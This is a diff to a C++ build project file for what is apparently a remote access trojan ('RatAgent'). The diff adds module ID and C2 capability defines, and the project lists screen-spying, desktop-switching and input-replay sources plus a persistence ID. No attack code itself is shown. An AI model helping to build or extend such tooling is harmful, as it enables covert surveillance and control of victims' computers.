@@ -49,12 +49,16 @@
   <PropertyGroup Label="RatAgentSwitches">
     <RatAgentDebug Condition="'$(RatAgentDebug)' == ''">1</RatAgentDebug>
     <RatAgentPersistId Condition="'$(RatAgentPersistId)' == ''">$(RatAgentDebug)</RatAgentPersistId>
+    <!-- 模块标识（见 core/module_id.h）：决定命名空间与 C2 侧标签/能力位。
+         新模块工程应把这两个值**写死成自己的**，别依赖默认值（默认是 full）。 -->
+    <RatAgentModuleId Condition="'$(RatAgentModuleId)' == ''">full</RatAgentModuleId>
+    <RatAgentModuleCaps Condition="'$(RatAgentModuleCaps)' == ''">(c2::kCapSys | c2::kCapRemote)</RatAgentModuleCaps>
   </PropertyGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
       <SDLCheck>true</SDLCheck>
-      <PreprocessorDefinitions>_CONSOLE;RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>_CONSOLE;RAT_MODULE_ID="$(RatAgentModuleId)";RAT_MODULE_CAPS=$(RatAgentModuleCaps);RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <LanguageStandard>stdcpp17</LanguageStandard>
       <AdditionalOptions>/utf-8 %(AdditionalOptions)</AdditionalOptions>
     </ClCompile>
@@ -70,7 +74,7 @@
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <IntrinsicFunctions>true</IntrinsicFunctions>
       <SDLCheck>true</SDLCheck>
-      <PreprocessorDefinitions>_CONSOLE;RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>_CONSOLE;RAT_MODULE_ID="$(RatAgentModuleId)";RAT_MODULE_CAPS=$(RatAgentModuleCaps);RAT_AGENT_DEBUG=$(RatAgentDebug);RAT_AGENT_PERSIST_ID=$(RatAgentPersistId);_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <LanguageStandard>stdcpp17</LanguageStandard>
       <AdditionalOptions>/utf-8 %(AdditionalOptions)</AdditionalOptions>
       <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
@@ -96,6 +100,7 @@
     <ClCompile Include="core\screen_spy.cpp" />
     <ClCompile Include="core\desktop_switch.cpp" />
     <ClCompile Include="core\input_replay.cpp" />
+    <ClInclude Include="core\module_id.h" />
     <ClInclude Include="core\agent_debug.h" />
     <ClInclude Include="core\protocol.h" />
     <ClInclude Include="core\agent_runtime.h" />
